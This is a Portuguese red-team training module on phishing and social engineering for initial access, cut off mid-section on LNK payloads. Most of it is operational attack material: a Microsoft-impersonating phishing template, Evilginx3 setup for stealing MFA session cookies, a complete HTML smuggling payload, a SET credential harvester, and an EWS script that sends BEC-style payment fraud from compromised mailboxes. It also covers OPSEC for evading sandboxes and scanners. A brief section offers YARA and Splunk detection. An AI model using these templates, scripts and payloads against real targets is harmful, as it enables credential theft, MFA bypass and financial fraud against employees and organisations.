---
layout: cyber
section: acesso-inicial
title: "Phishing e Engenharia Social"
---

# Phishing e Engenharia Social

## O Fator Humano Como Elo Mais Fraco

Phishing e engenharia social são o vetor de acesso inicial mais usado em operações de red team avançadas e em ataques reais de APT. CRTO I/II e OSEP exigem domínio dessas técnicas porque, independente da maturidade técnica do ambiente alvo, o fator humano permanece o elo mais fraco. Firewall de próxima geração, EDR avançado e monitoramento de rede bloqueiam ataques diretos; email de phishing bem construído entrega beacon na memória da workstation sem acionar nenhuma dessas defesas. Vantagem assimétrica: defensor protege todos os usuários, atacante compromete um.

MITRE ATT&CK relevantes: T1566 (Phishing), T1566.001 (Spear Phishing via Attachment), T1566.002 (Spear Phishing via Link), T1598 (Phishing for Information), T1534 (Internal Spearphishing).

---

## Taxonomia, Pretexto e Entrega

### Taxonomia de Phishing

**Spear Phishing** é phishing direcionado a um indivíduo ou grupo específico. Diferente do phishing em massa, o spear phishing utiliza informações coletadas via OSINT para personalizar a mensagem, aumentando drasticamente a taxa de sucesso. Um email que menciona o nome do destinatário, seu gerente, um projeto real em andamento, e imita o estilo de escrita da organização tem probabilidade muito maior de enganar até usuários treinados.

**Whaling** é spear phishing direcionado a executivos de alto escalão (C-level: CEO, CFO, CTO). O objetivo pode ser obter acesso a sistemas críticos, induzir transferências financeiras (fraude BEC - Business Email Compromise) ou capturar credenciais de alto privilégio. A abordagem exige pesquisa mais profunda sobre a vítima: agenda pública, viagens, declarações em entrevistas, relações com outros executivos.

**Vishing** (Voice Phishing) é engenharia social conduzida por telefone. O operador assume uma identidade falsa (helpdesk de TI, banco, fornecedor) e manipula a vítima verbalmente para revelar credenciais, instalar software, ou executar ações que comprometam a segurança. Técnicas incluem spoofing de caller ID para exibir números legítimos.

**Smishing** (SMS Phishing) utiliza mensagens de texto. Eficaz porque usuários frequentemente têm menos ceticismo em relação a SMS do que a emails. Muito utilizado para roubar credenciais de MFA via links para páginas de login falsas.

### O Ciclo de Engenharia Social

1. **Reconhecimento**: Coletar informações sobre a organização e alvos individuais
2. **Construção de Pretexto**: Criar uma narrativa convincente e identidade falsa
3. **Estabelecimento de Relacionamento**: Criar rapport (se aplicável ao vetor)
4. **Exploração**: Executar o ataque usando o pretexto estabelecido
5. **Saída**: Encerrar a interação sem levantar suspeitas

### Como Email Phishing Atravessa Defesas

O email percorre múltiplas camadas de verificação antes de chegar à caixa de entrada:
1. Verificação de reputação de IP do servidor de envio
2. Validação de SPF (Sender Policy Framework)
3. Validação de DKIM (DomainKeys Identified Mail)
4. Avaliação de DMARC (Domain-based Message Authentication)
5. Análise de conteúdo por gateway de segurança
6. Sandboxing de anexos e links
7. Avaliação de reputação de domínio

Para um phishing eficaz, o operador precisa configurar corretamente sua infraestrutura para passar nessas verificações.

### Evilginx3 e Adversary-in-the-Middle

O Evilginx3 opera como proxy reverso transparente entre a vítima e o site legítimo. Quando a vítima acessa o link de phishing:
1. O Evilginx3 faz a requisição ao site real em nome da vítima
2. Intercepta e modifica o HTML/JavaScript para substituir domínios
3. A vítima vê o site real (sem diferença visual)
4. A vítima faz login com MFA normalmente
5. O Evilginx3 captura o cookie de sessão pós-autenticação

Esse cookie de sessão é válido mesmo com MFA habilitado, porque o MFA já foi satisfeito durante o login real. O operador pode importar o cookie no browser e obter acesso autenticado sem conhecer a senha ou o código MFA.

### HTML Smuggling

HTML Smuggling é uma técnica que embute um payload dentro de um arquivo HTML que é decodificado e entregue pelo próprio navegador do usuário. Funciona porque:
1. O arquivo HTML não contém executável diretamente (evita filtros de gateway)
2. O payload está codificado em Base64 dentro do HTML
3. JavaScript no HTML decodifica o payload e usa a API Blob para criar um arquivo
4. O arquivo é automaticamente "baixado" pelo navegador

Gateways de email que verificam anexos analisam o HTML e não encontram executável - apenas strings Base64 e JavaScript. O navegador, ao renderizar o HTML, executa o JavaScript que reconstrói o payload.

---

## Na Prática

### Fase 1: Reconhecimento para Phishing

O objetivo desta fase é coletar:
- Lista de emails válidos de funcionários
- Estrutura organizacional (quem reporta a quem)
- Projetos ativos, tecnologias usadas, fornecedores
- Estilo de comunicação interno
- Informações sobre o alvo específico (para spear phishing)

**LinkedIn** é a fonte primária. Uma busca por `site:linkedin.com/in "empresa alvo" "cargo"` revela funcionários, hierarquia e projetos. A ferramenta `linkedin2username` pode gerar listas de possíveis usernames/emails a partir de nomes coletados.

**Hunter.io** agrega emails publicados na internet e infere o padrão de email da organização (ex: `{primeiro}.{ultimo}@empresa.com`). A API gratuita permite centenas de consultas mensais.

**theHarvester** automatiza coleta de emails de múltiplas fontes OSINT simultaneamente.

### Fase 2: Configuração de Infraestrutura de Phishing

Um domínio de phishing eficaz precisa:
- Ser registrado há pelo menos 30 dias (reputação)
- Ter registros SPF, DKIM e DMARC configurados
- Usar HTTPS (certificado Let's Encrypt é suficiente)
- O nome de domínio deve parecer legítimo (typosquatting, subdomain abuse, ou domínio temático)

Técnicas de escolha de domínio:
- **Typosquatting**: `micros0ft.com`, `goggle.com`
- **Homograph attack**: usando caracteres Unicode visualmente similares
- **Subdomain abuse**: `sharepoint.empresa-legitima.attacker.com`
- **Domínio temático**: `empresa-portal-seguro.com`

### Fase 3: GoPhish - Campanha Completa

GoPhish é o framework open-source padrão para simulações de phishing.

### Fase 4: Evilginx3 - Captura de Cookies MFA

Configuração do phishlet para Microsoft 365/Office 365.

### Fase 5: HTML Smuggling

Técnica para bypass de gateways de email que inspecionam anexos.

### Fase 6: Phishing Interno (Post-Compromise)

Após comprometer uma mailbox via password spraying ou credenciais vazadas, o phishing interno tem taxas de sucesso muito mais altas pois:
- Vem de um remetente legítimo dentro da organização
- Passa em todos os controles SPF/DKIM/DMARC
- Usuários confiam mais em emails de colegas
- Pode ser direcionado para pessoas específicas com contexto real

---

## Exemplos de Código / Comandos

### theHarvester - Coleta de Emails

```bash
# Instalar theHarvester
git clone https://github.com/laramies/theHarvester
cd theHarvester
pip3 install -r requirements/base.txt

# Coletar emails da organização alvo usando múltiplas fontes
python3 theHarvester.py -d empresa-alvo.com.br -b all -l 500 -f resultado_harvest

# Fontes específicas mais úteis
python3 theHarvester.py -d empresa-alvo.com.br -b google,bing,linkedin,hunter,dnsdumpster

# Resultado: lista de emails, IPs, subdomínios, ASNs
cat resultado_harvest.xml | grep '<email>' | sed 's/<[^>]*>//g' | sort -u > emails.txt
```

### Hunter.io via API

```bash
# Descobrir padrão de email da empresa
curl "https://api.hunter.io/v2/domain-search?domain=empresa-alvo.com&api_key=SUA_API_KEY&limit=100" | python3 -m json.tool

# Verificar se email específico existe
curl "https://api.hunter.io/v2/email-verifier?email=nome.sobrenome@empresa.com&api_key=SUA_API_KEY"

# Extrair apenas os emails do resultado
curl "https://api.hunter.io/v2/domain-search?domain=empresa.com&api_key=KEY" | \
  python3 -c "import json,sys; data=json.load(sys.stdin); [print(e['value']) for e in data['data']['emails']]"
```

### linkedin2username - Geração de Lista de Usuários

```bash
git clone https://github.com/initstring/linkedin2username
cd linkedin2username

# Gerar lista de nomes a partir da empresa no LinkedIn
# Requer credenciais do LinkedIn (use conta burner)
python3 linkedin2username.py -u seuemail@gmail.com -c "Nome da Empresa" -n 5 -s 0

# Combinar com padrão de email descoberto
# Se padrão é primeiro.ultimo@empresa.com:
cat output/linkedin2username-empresa/first.last.txt | \
  awk '{print $1"@empresa.com.br"}' > lista_emails_gerados.txt
```

### Configuração DNS para Servidor de Phishing (Cloudflare/Route53)

```bash
# Registrar domínio de phishing e configurar DNS

# SPF Record (TXT record no DNS)
# Autoriza apenas o seu servidor a enviar emails como este domínio
v=spf1 ip4:SEU_IP_DO_SERVIDOR ~all

# DKIM - Gerar par de chaves
# No servidor de phishing (Postfix/GoPhish):
openssl genrsa -out dkim_private.pem 2048
openssl rsa -in dkim_private.pem -pubout -out dkim_public.pem

# Registrar chave pública no DNS (TXT record):
# Nome: mail._domainkey.seudominiodephishing.com
# Valor: v=DKIM1; k=rsa; p=MIIBIjANBgkqhki...
cat dkim_public.pem | grep -v "BEGIN\|END" | tr -d '\n'

# DMARC Record (TXT record)
# Nome: _dmarc.seudominiodephishing.com
# Valor:
v=DMARC1; p=none; rua=mailto:dmarc@seudominiodephishing.com

# MX Record para receber respostas
# Nome: seudominiodephishing.com
# Valor: 10 mail.seudominiodephishing.com

# Testar configuração
dig TXT seudominiodephishing.com
dig TXT mail._domainkey.seudominiodephishing.com
dig TXT _dmarc.seudominiodephishing.com

# Verificar score de reputação
# https://www.mail-tester.com - enviar email de teste e checar score
# Alvo: 10/10 antes de iniciar campanha
```

### GoPhish - Setup e Configuração

```bash
# Download e instalação
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish

# Configurar config.json
cat > config.json << 'EOF'
{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/seudominio.com/fullchain.pem",
    "key_path": "/etc/letsencrypt/live/seudominio.com/privkey.pem"
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "",
  "logging": {
    "filename": "",
    "level": ""
  }
}
EOF

# Iniciar GoPhish (anota a senha gerada no primeiro boot)
./gophish

# Acessar interface web
# https://127.0.0.1:3333 (via SSH tunnel se servidor remoto)
ssh -L 3333:127.0.0.1:3333 usuario@servidor-gophish

# Configurar SMTP Sending Profile no GoPhish UI:
# Host: localhost:25 (se usando Postfix local)
# From: "TI Corporativo <ti@seudominiodephishing.com>"
# Username/Password: (se usando relay)

# Configurar Email Template com HTML convincente (ver exemplo abaixo)
# Configurar Landing Page (cópia do site alvo)
# Configurar Target Group (lista de emails)
# Lançar Campaign com data/hora programada

# Monitorar resultados via API
curl -k -s -H "Authorization: Bearer API_KEY" \
  "https://127.0.0.1:3333/api/campaigns/" | python3 -m json.tool

# Ver resultados de uma campanha específica
curl -k -s -H "Authorization: Bearer API_KEY" \
  "https://127.0.0.1:3333/api/campaigns/1/results" | \
  python3 -c "
import json,sys
data = json.load(sys.stdin)
for r in data['results']:
    print(f\"{r['first_name']} {r['last_name']} | {r['email']} | Status: {r['status']}\")
"
```

### Template HTML de Email de Phishing Convincente

```html
<!-- Template: Notificação de MFA - imita Microsoft -->
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="font-family: Segoe UI, Arial, sans-serif; background-color: #f3f3f3; margin: 0; padding: 20px;">
<table width="600" cellpadding="0" cellspacing="0" style="background:#fff; margin:0 auto; border-radius:4px;">
  <tr>
    <td style="background:#0078d4; padding:20px; text-align:center;">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="108" height="23" alt="Microsoft">
    </td>
  </tr>
  <tr>
    <td style="padding:30px;">
      <h2 style="color:#333; font-size:20px;">Ação Necessária: Verifique seu método de autenticação</h2>
      <p style="color:#666; line-height:1.6;">Detectamos que seu método de autenticação multifator (MFA) está 
      prestes a expirar. Para continuar acessando os recursos da empresa sem interrupções, você precisa 
      reverificar seu dispositivo.</p>
      <p style="color:#666; line-height:1.6;"><strong>Esta ação é necessária até {{.Date}}</strong></p>
      <div style="text-align:center; margin:30px 0;">
        <a href="{{.URL}}" style="background:#0078d4; color:#fff; padding:12px 24px; 
           text-decoration:none; border-radius:2px; font-weight:bold; display:inline-block;">
          Verificar Dispositivo
        </a>
      </div>
      <p style="color:#999; font-size:12px;">Se você não solicitou esta verificação, ignore este email. 
      Caso precise de ajuda, contate o suporte de TI.</p>
    </td>
  </tr>
  <tr>
    <td style="background:#f8f8f8; padding:15px; text-align:center; border-top:1px solid #eee;">
      <p style="color:#999; font-size:11px; margin:0;">
        Microsoft Corporation | One Microsoft Way | Redmond, WA 98052<br>
        &copy; 2024 Microsoft Corporation. All rights reserved.
      </p>
    </td>
  </tr>
</table>
</body>
</html>
```

### Evilginx3 - Setup Completo e Phishlet Microsoft 365

```bash
# Instalação do Evilginx3
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
go build -o evilginx main.go

# Ou via release binário
wget https://github.com/kgretzky/evilginx2/releases/latest/download/evilginx-linux-64bit.tar.gz
tar -xzf evilginx-linux-64bit.tar.gz

# Pré-requisitos:
# - Porta 80 e 443 abertas no servidor
# - Domínio apontando para o servidor (registro A)
# - Desabilitar Apache/Nginx que possam estar na porta 80/443
systemctl stop apache2 nginx

# Iniciar Evilginx3
./evilginx -developer  # modo developer para testes
./evilginx            # modo produção

# Dentro do CLI do Evilginx3:
# Configurar domínio e IP
config domain seudominiodephishing.com
config ipv4 external SEU_IP_EXTERNO

# Listar phishlets disponíveis
phishlets

# Habilitar phishlet do Microsoft 365
phishlets hostname o365 seudominiodephishing.com
phishlets enable o365

# Criar lure (URL de phishing)
lures create o365
lures get-url 0
# Saída: https://login.seudominiodephishing.com/AbCdEf1234

# Configurar redirecionamento após captura
lures edit 0 redirect_url https://portal.empresa-alvo.com.br

# Monitorar sessões capturadas
sessions

# Ver detalhes de uma sessão específica (inclui cookies)
sessions 1

# Exportar cookies capturados
sessions 1
# Copiar o campo "tokens" que contém os cookies de sessão

# Importar cookies no browser via extensão EditThisCookie ou Cookie-Editor
# Navegar para o serviço legítimo sem precisar de senha ou MFA
```

### HTML Smuggling - Payload Completo

```html
<!DOCTYPE html>
<html>
<head>
<title>Documento</title>
</head>
<body>
<h2>Visualizando documento...</h2>
<p>Por favor aguarde enquanto o documento é carregado.</p>

<script>
// O payload (arquivo executável/DLL/HTA) está codificado em Base64
// Neste exemplo, um arquivo HTA simples como demonstração
var payloadBase64 = "PHNjcmlwdCBsYW5ndWFnZT0idmJzY3JpcHQiPg0KTXNnQm94ICJIZWxsbyBXb3JsZCINCjwvc2NyaXB0Pg==";

// Função para converter Base64 para array de bytes
function base64ToBytes(base64) {
    var binaryString = atob(base64);
    var bytes = new Uint8Array(binaryString.length);
    for (var i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes;
}

// Criar Blob com o payload decodificado
var payload = base64ToBytes(payloadBase64);
var blob = new Blob([payload], { type: 'application/octet-stream' });

// Criar link de download temporário e acionar automaticamente
var url = window.URL.createObjectURL(blob);
var link = document.createElement('a');
link.href = url;
link.download = 'Documento_Confidencial.hta';  // ou .exe, .iso, .img, .zip
document.body.appendChild(link);
link.click();

// Limpar
setTimeout(function() {
    window.URL.revokeObjectURL(url);
    document.body.removeChild(link);
}, 1000);
</script>

<!-- Alternativa com XMLHttpRequest para payloads maiores -->
<script>
// Versão avançada: múltiplos chunks para evitar limites de tamanho
var chunks = [
    "TVqQAAMAAAAEAAAA//8A...",  // chunk 1
    "AAAAAAAAAAAnAAAAA...",      // chunk 2
    // ...mais chunks
];

// Concatenar e decodificar
var combined = chunks.join('');
var payload = base64ToBytes(combined);
</script>
</body>
</html>
```

### Social Engineering Toolkit (SET) - Credential Harvester

```bash
# Instalar SET
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip3 install -r requirements/requirements.txt
python3 setup.py install

# Iniciar SET
sudo setoolkit

# Menu interativo SET:
# 1) Social-Engineering Attacks
#    -> 2) Website Attack Vectors
#       -> 3) Credential Harvester Attack Method
#          -> 2) Site Cloner
#             -> Inserir IP do servidor
#             -> Inserir URL para clonar: https://login.microsoftonline.com

# Ou via linha de comando para automação:
echo "1
2
3
2
SEU_IP
https://accounts.google.com/signin
" | sudo setoolkit

# Credenciais capturadas aparecem no terminal e são salvas em:
# /var/www/harvester_date_time.txt
tail -f /var/www/*.txt
```

### Phishing Interno via EWS (Exchange Web Services)

```python
#!/usr/bin/env python3
"""
Script para phishing interno após comprometer credenciais de mailbox.
Usa EWS para enviar emails a partir de conta legítima interna.
"""
from exchangelib import DELEGATE, Account, Credentials, Configuration, NTLM
from exchangelib import Message, Mailbox, HTMLBody
import datetime

# Credenciais comprometidas
TARGET_EMAIL = "vitima@empresa.com.br"
USERNAME = "DOMINIO\\usuario.comprometido"
PASSWORD = "senha_capturada"
EWS_URL = "https://mail.empresa.com.br/EWS/Exchange.asmx"

def send_internal_phish(target_emails, subject, html_body):
    """Envia phishing interno a partir de conta comprometida."""
    
    # Autenticar no Exchange
    credentials = Credentials(USERNAME, PASSWORD)
    config = Configuration(
        service_endpoint=EWS_URL,
        credentials=credentials,
        auth_type=NTLM
    )
    account = Account(
        primary_smtp_address=TARGET_EMAIL,
        config=config,
        autodiscover=False,
        access_type=DELEGATE
    )
    
    # Enviar email para cada alvo
    for email in target_emails:
        msg = Message(
            account=account,
            subject=subject,
            body=HTMLBody(html_body),
            to_recipients=[Mailbox(email_address=email)],
        )
        msg.send()
        print(f"[+] Email enviado para: {email}")

# Lista de alvos (ex: time de finanças)
alvos = [
    "cfo@empresa.com.br",
    "financeiro@empresa.com.br",
    "pagamentos@empresa.com.br"
]

subject = "Urgente: Aprovação de Pagamento - Favor Confirmar"
html_body = """
<html>
<body>
<p>Olá,</p>
<p>Conforme combinamos na reunião de ontem, preciso que você aprove 
urgentemente a transferência abaixo. O prazo é hoje até 17h.</p>
<p>Por favor acesse o portal de aprovações: 
<a href="https://seudominiodephishing.com/portal">Aprovar Transferência</a></p>
<p>Atenciosamente,<br>
João Silva<br>
Gerente de Finanças</p>
</body>
</html>
"""

send_internal_phish(alvos, subject, html_body)


# Dump da Global Address List (GAL) via EWS
def dump_gal(account):
    """Extrai todos os emails da Global Address List."""
    from exchangelib import contacts
    emails = []
    
    # Iterar sobre contatos globais
    for contact in account.contacts.all():
        if hasattr(contact, 'email_addresses') and contact.email_addresses:
            for email_addr in contact.email_addresses:
                emails.append({
                    'name': str(contact.display_name),
                    'email': str(email_addr.email),
                    'title': str(getattr(contact, 'job_title', ''))
                })
    
    return emails

# Exportar GAL
gal = dump_gal(account)
with open('gal_dump.csv', 'w') as f:
    f.write("Nome,Email,Cargo\n")
    for entry in gal:
        f.write(f"{entry['name']},{entry['email']},{entry['title']}\n")

print(f"[+] {len(gal)} entradas extraídas da GAL")
```

---

## Detecção e OPSEC

### Indicadores de Comprometimento (IoCs) Gerados

**Lado do servidor de phishing:**
- Domínio recém-registrado (< 30 dias) com certificado TLS
- Padrão de tráfego: muitos usuários do mesmo IP corporativo acessando o mesmo novo domínio
- Headers de email suspeitos: `X-Mailer`, timestamp discrepante
- DKIM/SPF válidos mas domínio sem histórico de envio

**Lado do alvo (detecção pelo blue team):**
- Email gateway alerts: domínio similar ao legítimo
- Proxy/DNS logs: resolução de domínio de phishing por múltiplos hosts
- SIEM: múltiplos usuários clicando no mesmo link externo
- Browser: acesso a site com certificado recém-emitido

### Técnicas OPSEC para o Operador

**Categorização e Warm-up do Domínio:**
Antes de usar o domínio para phishing, é necessário construir reputação:
```bash
# Criar conteúdo legítimo no domínio (blog, landing page) 2-4 semanas antes
# Enviar emails de teste para contas próprias (Gmail, Outlook)
# Verificar score no mail-tester.com e mxtoolbox.com

# Warm-up gradual de volume:
# Dia 1-7: 10-20 emails/dia
# Dia 8-14: 50-100 emails/dia
# Dia 15+: volume de campanha real
```

**Redirectors (Proteção do servidor C2):**
```bash
# Usar servidor intermediário (redirector) na frente do GoPhish/Evilginx
# Redirector: servidor barato/VPS que apenas encaminha tráfego
# C2/Phishing Server: protegido, não exposto diretamente

# Apache redirector com mod_rewrite:
# Encaminhar apenas tráfego com User-Agent de browser real
# Bloquear scanners, bots, IPs de empresas de segurança

# /etc/apache2/sites-available/redirector.conf
RewriteEngine On

# Bloquear scanners conhecidos
RewriteCond %{HTTP_USER_AGENT} "curl|wget|python|scanner|bot" [NC]
RewriteRule .* - [F]

# Bloquear IPs de empresas de sandbox/segurança
RewriteCond %{REMOTE_ADDR} ^(x\.x\.x\.x|y\.y\.y\.y)$
RewriteRule .* - [F]

# Encaminhar tráfego legítimo para servidor de phishing
RewriteRule ^(.*)$ https://SERVIDOR_PHISHING_INTERNO$1 [P,L]
```

**Ofuscação do Link de Phishing:**
```
# Usar encurtadores de URL (bit.ly, tinyurl) - detectáveis
# Usar serviços legítimos como redirectores:
# - Google AMP: https://amp.google.com/cache.html#aHR0cHM6Ly9zZXVzaXRlLmNvbQ==
# - Google Translate: https://translate.google.com/translate?sl=en&u=https://seusite.com
# - Open Redirects em sites legítimos
```

**Geofencing no GoPhish:**
```bash
# Bloquear acessos de fora do país alvo ou de IPs não corporativos
# Configurar no servidor web do GoPhish (Nginx/Apache):

# Nginx geo blocking:
geoip_country /usr/share/GeoIP/GeoIP.dat;
map $geoip_country_code $allowed_country {
    default no;
    BR yes;  # Permitir apenas Brasil
}

server {
    if ($allowed_country = no) {
        return 403;
    }
}
```

**Análise de Cliques e Fingerprinting:**
```javascript
// Adicionar ao HTML da landing page para coletar info da vítima
// antes de mostrar o formulário de credenciais

fetch('/collect', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        // Não inclua fingerprint que possa alertar a vítima
    })
});
```

**Payload OPSEC no HTML Smuggling:**
```
# Usar arquivo .iso ou .img em vez de .exe (menos suspeito, mais eficaz no Windows 10+)
# Windows monta ISOs automaticamente ao clicar duas vezes
# Dentro do ISO: arquivo .lnk que executa payload via LOLBin

# Usar .zip protegido por senha (evita scan do gateway)
# Senha no corpo do email
# O payload dentro do .zip pode ser um .js, .vbs, ou .hta

# Extensão preferida por ambiente:
# Windows 10/11: .iso, .img (mount automático), .lnk dentro
# Email sem macro habilitada: .hta, .js, .vbs
# Com macro permitida: .xlsm, .docm
```

### Detecção por Defenders

**Regras YARA para HTML Smuggling:**
```yara
rule HTML_Smuggling_Download {
    meta:
        description = "HTML Smuggling via Blob URL"
        author = "Blue Team"
    strings:
        $blob = "Blob(" nocase
        $base64 = "atob(" nocase
        $download = "download" nocase
        $create_obj = "createObjectURL" nocase
    condition:
        all of them
}
```

**Query SIEM (Splunk) para Detecção:**
```spl
# Detectar múltiplos usuários clicando em mesmo domínio externo
index=proxy sourcetype=bluecoat
| stats count, dc(src_ip) as unique_users by cs_host, cs_uri_path
| where unique_users > 5 AND count > 20
| eval risk = if(unique_users > 10, "HIGH", "MEDIUM")
| sort -risk, -unique_users

# Detectar email de domínio suspeito (registrado recentemente)
index=email sourcetype=exchange
| where like(sender_domain, "%-secure-%") OR like(sender_domain, "%portal%")
| lookup domain_age.csv domain as sender_domain OUTPUT age_days
| where age_days < 30
| table _time, sender, recipient, subject, sender_domain, age_days
```

---

## Módulos Relacionados

`02_office_vba_macros.md` cobre delivery de payload via documentos Office após o phishing. `03_windows_script_host.md` traz payloads alternativos via HTA/JScript pra HTML smuggling. `04_password_spraying_owa.md` é o vetor pra comprometer mailbox e executar phishing interno. `06_reconhecimento_passivo.md` é a etapa anterior — OSINT que alimenta o pretexto. MITRE ATT&CK: T1566 + T1566.001 + T1566.002 + T1534 (Internal Spearphishing) + T1598 (Phishing for Info) + T1056.003 (Web Portal Capture, Evilginx).

---

## Leitura Complementar

- GoPhish — https://github.com/gophish/gophish
- Evilginx2/3 — https://github.com/kgretzky/evilginx2
- theHarvester — https://github.com/laramies/theHarvester
- SET — https://github.com/trustedsec/social-engineer-toolkit
- MailSniper — https://github.com/dafthack/MailSniper
- linkedin2username — https://github.com/initstring/linkedin2username
- Kevin Mitnick — *The Art of Intrusion*
- Cobalt Strike User Guide — Infrastructure chapter
- CRTO Course Material — Initial Access module
- Joe Vest — *Red Team Development and Operations*

---

## Técnicas MalTrak - Módulos 02 e 03

### Psicologia do Phishing: Gatilhos Emocionais

O phishing eficaz manipula emoções específicas que reduzem o pensamento crítico. Os gatilhos mais explorados:

| Emoção | Técnica | Exemplo de assunto |
|--------|---------|-------------------|
| **Urgência** | Prazo curto, consequência imediata | "Sua conta será suspensa em 24h" |
| **Medo** | Ameaça de perda, punição | "Atividade suspeita detectada — ação requerida" |
| **Curiosidade** | Informação valiosa ou exclusiva | "Veja quem visualizou seu perfil" |
| **Confiança** | Impersonar autoridade conhecida | "IT Helpdesk — atualização obrigatória de senha" |
| **Ganância** | Oferta lucrativa inesperada | "Você foi selecionado para bônus salarial" |
| **Altruísmo** | Apelar para ajudar alguém | "Colega precisa de sua aprovação urgente" |

**Princípio-chave (Cialdini):** quanto maior a urgência percebida, menor o tempo de análise crítica. E-mails com prazos de 24h têm taxa de clique 3x maior que e-mails sem urgência.

---

### Infraestrutura de Phishing: Domínios e DNS

Antes de qualquer campanha, a infraestrutura deve estar preparada. Um domínio recém-registrado tem reputação zero — filtros antispam podem bloqueá-lo. Passos para construir infraestrutura confiável:

**1. Registro de domínio via AWS Route 53:**
- Escolha um domínio typosquatting ou temático relacionado ao alvo
- Exemplos: `suporte-microsoft.com`, `docusign-verify.com`, `rh-empresa.com`
- Route 53 → "Register Domain" → configure Hosted Zone

**2. Configuração DNS crítica para deliverability:**

```
# SPF - Define quais servidores podem enviar em nome do domínio
TXT @ "v=spf1 include:sendgrid.net ~all"

# DKIM - Assinatura criptográfica do e-mail (Sendgrid gera a chave)
CNAME s1._domainkey  s1.domainkey.u12345.wl.sendgrid.net

# DMARC - Política para e-mails que falham SPF/DKIM
TXT _dmarc "v=DMARC1; p=none; rua=mailto:dmarc@seudominio.com"
```

Sem SPF/DKIM configurados, e-mails chegam na pasta de spam ou são rejeitados. Com configuração correta, passam pelos filtros de email corporativos.

**3. Aquecimento de domínio:**
- Envie e-mails legítimos nos primeiros dias antes da campanha
- Isso constrói reputação junto aos filtros antispam
- Período recomendado: 2-7 dias antes do ataque

---

### GoPhish: Gerenciamento de Campanhas

GoPhish é a ferramenta padrão para gerenciar campanhas de spearphishing em red team.

**Instalação e acesso:**

```bash
# Acessar painel via túnel SSH (não expor à internet)
ssh -i ec2_key_pair.pem ec2-user@<gophish_ip> -L 3333:localhost:3333

# Painel web: https://localhost:3333
# Credenciais padrão: admin / gophish (MUDE imediatamente)
```

**Componentes de uma campanha GoPhish:**

| Componente | O que é | Exemplo |
|-----------|---------|---------|
| **Sending Profile** | Configuração SMTP (Sendgrid) | Host: smtp.sendgrid.net:587 |
| **Email Template** | Corpo do e-mail de phishing | HTML com tracking pixel + link para landing page |
| **Landing Page** | Página falsa que captura credenciais | Clone do Outlook 365 login |
| **User Groups** | Lista de alvos (email, nome, depto) | CSV exportado do LinkedIn/OSINT |
| **Campaign** | Une todos os componentes | "Campanha RH Q3 2024" |

**Integração GoPhish + Sendgrid:**

```
GoPhish → Sendgrid SMTP Relay → Internet → Caixa de entrada da vítima

Configuração Sending Profile:
  Host: smtp.sendgrid.net
  Port: 587
  Username: apikey
  Password: <sua_api_key_sendgrid>
  From: "IT Helpdesk" <helpdesk@seudominio.com>
```

**Sendgrid**: 100 emails/dia no tier gratuito. Tier pago sem limite diário.

**Métricas rastreadas pelo GoPhish:**
- Email enviado / entregue / aberto (via tracking pixel 1x1)
- Link clicado (com timestamp e IP da vítima)
- Credenciais submetidas (usuário/senha na landing page)
- Qual usuário reportou o e-mail como suspeito (métrica defensiva)

---

### Evilginx 2: Bypass de 2FA via Proxy MITM

Evilginx 2 é um servidor proxy MITM que intercepta o fluxo de autenticação entre a vítima e o serviço legítimo. Captura não apenas credenciais mas **cookies de sessão autenticados** — tornando 2FA irrelevante.

**Como funciona o ataque:**

```
Vítima                    Evilginx 2                  Serviço Real
  |                           |                             |
  |---- clica no link ------->|                             |
  |                           |------ proxy request ------->|
  |                           |<----- resposta HTML --------|
  |<-- página idêntica -------|                             |
  |--- digita user+senha ---->|                             |
  |                           |--- encaminha credenciais -->|
  |<--- MFA solicitado -------|                             |
  |--- digita código MFA ---->|                             |
  |                           |--- encaminha MFA code ----->|
  |                           |<--- SESSION COOKIE ---------|
  |                           |  [CAPTURA o cookie!]        |
  |<--- login bem-sucedido ---|                             |
```

**Por que o 2FA não protege:** a vítima completa o fluxo legítimo incluindo o segundo fator. Evilginx é transparente — a vítima realmente fez login com sucesso. O atacante usa o cookie capturado para acessar a conta sem precisar de senha ou 2FA.

**Phishlets disponíveis no Evilginx 2:**
- LinkedIn, Office 365 / Outlook, Gmail, Facebook, GitHub

**Comandos básicos:**

```bash
phishlets hostname linkedin seudominio.com
phishlets enable linkedin
lures create linkedin
lures get-url 0          # Gera URL de phishing personalizada
```

**Indicadores de detecção:**
- Certificado TLS emitido para domínio novo (< 30 dias)
- URL contém subdomínio não-padrão (`login.linkedin.seudominio.com`)
- Latência levemente maior (hop adicional do proxy MITM)
- IP de destino pertence a cloud provider (AWS/GCP)

---

### Módulo 03: Vetores de Acesso Inicial com Payloads

#### Payload tipo EXE

Mais simples, mas mais detectado. Entrega via ZIP com senha para evadir email gateway:

```
Incorrect_Invoice_2024.zip  (senha: 1234)
└── Incorrect_Invoice_2024.exe
```

**Detecção:** alta. AV/EDR escaneiam executáveis. Windows SmartScreen alerta para EXEs sem assinatura de código válida.

**MITRE:** T1566.001 (entrega), T1204.002 (execução pelo usuário)

---

#### Payload tipo LNK (Shortcut)

Arquivos `.lnk` podem executar comandos arbitrários. Bypassam application whitelisting porque o arquivo em si não é um executável — é um atalho.

**Estrutura:**

```
Target: C:\Windows\System32\cmd.exe
Arguments: /c powershell.exe -WindowStyle hidden -EncodedCommand <base64>
Icon: C:\Windows\System32\shell32.dll, index 23  (ícone de PDF ou Word)
```

**Técnica de evasão — renomear powershell:**

```cmd
# Copia powershell.exe com nome diferente para %temp%
# Evita regras de detecção baseadas no nome "powershell.exe"
